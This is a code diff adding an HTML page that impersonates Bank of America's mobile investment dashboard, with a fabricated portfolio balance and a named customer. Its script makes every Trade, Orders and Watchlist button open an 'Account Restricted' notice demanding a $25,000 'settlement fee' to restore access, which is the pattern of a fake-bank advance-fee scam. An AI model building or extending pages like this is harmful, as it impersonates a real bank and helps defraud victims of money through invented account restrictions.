@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of America - Invest</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="mobile-container dashboard-mode">
+        <!-- Top Navigation -->
+        <header class="top-nav">
+            <div class="nav-left">
+                <div class="nav-item" style="margin-left: 0;">
+                    <i class="fas fa-bars nav-icon"></i>
+                    <span class="nav-text">Menu</span>
+                </div>
+            </div>
+            <div class="nav-right">
+                <div class="nav-item">
+                    <i class="far fa-envelope nav-icon"></i>
+                    <span class="nav-text">Inbox</span>
+                </div>
+                <div class="nav-item">
+                    <i class="fas fa-shopping-cart nav-icon"></i>
+                    <span class="nav-text">Products</span>
+                </div>
+                <div class="nav-item" id="logout-btn">
+                    <i class="fas fa-sign-out-alt nav-icon"></i>
+                    <span class="nav-text">Log Out</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content" style="padding-top: 60px;">
+            <div class="invest-summary">
+                <div class="invest-total-label">Total Investment Value</div>
+                <div class="invest-total-amount">$178,542.18</div>
+                <div class="invest-change">+$1,932.80 (+1.10%)</div>
+            </div>
+
+            <div class="invest-actions">
+                <div class="invest-btn" id="tradeBtn">Trade</div>
+                <div class="invest-btn" id="ordersBtn">Orders</div>
+                <div class="invest-btn" id="watchlistBtn">Watchlist</div>
+            </div>
+
+            <div class="section-header">Your Holdings</div>
+            <div class="holdings-list">
+                <div class="holding-item">
+                    <div>
+                        <div class="holding-name">NVIDIA Corp</div>
+                        <div class="holding-symbol">NVDA</div>
+                    </div>
+                    <div>
+                        <div class="holding-value">$48,250.00</div>
+                        <div class="holding-change">+$1,125.40</div>
+                    </div>
+                </div>
+                <div class="holding-item">
+                    <div>
+                        <div class="holding-name">Tesla Inc</div>
+                        <div class="holding-symbol">TSLA</div>
+                    </div>
+                    <div>
+                        <div class="holding-value">$42,180.00</div>
+                        <div class="holding-change">+$680.20</div>
+                    </div>
+                </div>
+                <div class="holding-item">
+                    <div>
+                        <div class="holding-name">Apple Inc</div>
+                        <div class="holding-symbol">AAPL</div>
+                    </div>
+                    <div>
+                        <div class="holding-value">$35,920.00</div>
+                        <div class="holding-change">+$412.50</div>
+                    </div>
+                </div>
+                <div class="holding-item">
+                    <div>
+                        <div class="holding-name">Microsoft Corp</div>
+                        <div class="holding-symbol">MSFT</div>
+                    </div>
+                    <div>
+                        <div class="holding-value">$28,500.00</div>
+                        <div class="holding-change">+$0.00</div>
+                    </div>
+                </div>
+                <div class="holding-item">
+                    <div>
+                        <div class="holding-name">Bitcoin Trust</div>
+                        <div class="holding-symbol">GBTC</div>
+                    </div>
+                    <div>
+                        <div class="holding-value">$23,692.18</div>
+                        <div class="holding-change negative">-$285.30</div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Bottom Navigation -->
+        <nav class="bottom-nav">
+            <div class="nav-item" id="accounts-tab">
+                <div class="icon-circle">
+                    <i class="fas fa-dollar-sign"></i>
+                </div>
+                <span>Accounts</span>
+            </div>
+            <div class="nav-item" id="pay-transfer-tab">
+                <div class="icon-circle">
+                    <i class="fas fa-exchange-alt"></i>
+                </div>
+                <span>Pay & Transfer</span>
+            </div>
+            <div class="nav-item" id="deposit-checks-tab">
+                <div class="icon-circle">
+                    <i class="fas fa-camera"></i>
+                </div>
+                <span>Deposit Checks</span>
+            </div>
+            <div class="nav-item active">
+                <div class="icon-circle">
+                    <i class="fas fa-chart-line"></i>
+                </div>
+                <span>Invest</span>
+            </div>
+        </nav>
+    </div>
+
+    <!-- RESTRICTION MODAL - NO VERIFICATION CODE, JUST RESTRICTION MESSAGE -->
+    <div id="restrictionModal" class="modal-overlay">
+        <div class="security-modal-content">
+            <div class="security-modal-header">
+                <img src="logo.svg" alt="Bank of America Logo" class="security-logo-icon">
+                <span class="security-logo-text">BANK OF AMERICA</span>
+            </div>
+            <div class="security-body">
+                <div class="security-icon-lock" style="color: #E31837;">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <div class="security-title">Account Restricted</div>
+                <div class="security-text" style="text-align: left;">
+                    Dear Megan Woods,<br><br>
+                    Due to unresolved circumstances with a third party.<br><br>
+                    A settlement fee of <strong style="color: #E31837;">$25,000.00</strong> is required to restore full access and remove the restriction, so normal account operations will be restored.
+                </div>
+                <button id="closeRestrictionBtn" class="security-btn">I Understand</button>
+                <div class="security-footer-link" id="contactSupportLink">Contact Support</div>
+            </div>
+        </div>
+    </div>
+
+    <script src="auth.js"></script>
+    <script>
+        BoAAuth.requireAuth();
+
+        document.getElementById('logout-btn').addEventListener('click', function() {
+            BoAAuth.logout();
+            window.location.href = 'index.html';
+        });
+        
+        document.getElementById('accounts-tab').addEventListener('click', function() {
+            window.location.href = 'dashboard.html';
+        });
+
+        document.getElementById('pay-transfer-tab').addEventListener('click', function() {
+            window.location.href = 'pay_transfer.html';
+        });
+
+        document.getElementById('deposit-checks-tab').addEventListener('click', function() {
+            window.location.href = 'deposit_checks.html';
+        });
+
+        // ========================
+        // RESTRICTION MODAL - NO VERIFICATION CODE
+        // ========================
+        const restrictionModal = document.getElementById('restrictionModal');
+        const closeRestrictionBtn = document.getElementById('closeRestrictionBtn');
+        const contactSupportLink = document.getElementById('contactSupportLink');
+        
+        // Get all action buttons (Trade, Orders, Watchlist)
+        const tradeBtn = document.getElementById('tradeBtn');
+        const ordersBtn = document.getElementById('ordersBtn');
+        const watchlistBtn = document.getElementById('watchlistBtn');
+        
+        // Function to show restriction modal immediately - NO CODE VERIFICATION
+        function showRestrictionModal() {
+            restrictionModal.style.display = 'flex';
+        }
+
+        // Add click listeners to all invest action buttons - directly show restriction without any verification
+        if (tradeBtn) {
+            tradeBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                showRestrictionModal();
+            });
+        }
+        
+        if (ordersBtn) {
+            ordersBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                showRestrictionModal();
+            });
+        }
+        
+        if (watchlistBtn) {
+            watchlistBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                showRestrictionModal();
+            });
+        }
+
+        // Close modal on "I Understand"
+        if (closeRestrictionBtn) {
+            closeRestrictionBtn.addEventListener('click', function() {
+                restrictionModal.style.display = 'none';
+            });
+        }
+
+        // Contact Support - closes modal
+        if (contactSupportLink) {
+            contactSupportLink.addEventListener('click', function() {
+                restrictionModal.style.display = 'none';
+            });
+        }
+
+        // Click outside modal to close
+        restrictionModal.addEventListener('click', function(e) {
+            if (e.target === restrictionModal) {
+                restrictionModal.style.display = 'none';
+            }
+        });
+
+        // Make sure restriction modal is hidden on load
+        window.onload = function() {
+            if (restrictionModal) {
+                restrictionModal.style.display = 'none';
+            }
+        };
+    </script>
+</body>
+</html>
